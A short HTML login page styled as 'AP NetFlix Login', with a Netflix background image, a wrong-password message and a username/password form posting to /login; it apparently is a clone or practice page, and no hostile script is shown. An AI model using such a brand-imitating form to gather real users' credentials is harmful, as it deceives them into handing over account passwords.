<!DOCTYPE html>
<html>
  <head>
    <title>Login</title>
    </head>
  <body style="text-align: center;color: red;background: url(https://www.myanmore.com/wp-content/uploads/2019/05/netflix-background-9.jpg)" >
    <h1>AP NetFlix Login</h1>
    <br /><br /><br/><br/><br/><br/>
    <div style="background-color: red; padding: 1%; max-width: 300px; border-radius: 3px; margin: auto;color:black;font-size: 15px; text-align: left ">Username or Password is wrong!
      <form action="/login" method="post">
        <br/><br/>
        <input name="username" type="text" placeholder="Username" style="display:block; margin: auto; margin-bottom: 10px; padding: 5px; width: 94%;" required />
        <input name="password" type="password" placeholder="Password" style="display:block; margin: auto; margin-bottom: 30px; padding: 5px; width: 94%;" required />
        <button type="submit" style="display:block; width: 100%; padding: 7px;">Login</button>
      </form>
    </div>
  </body>
</html>
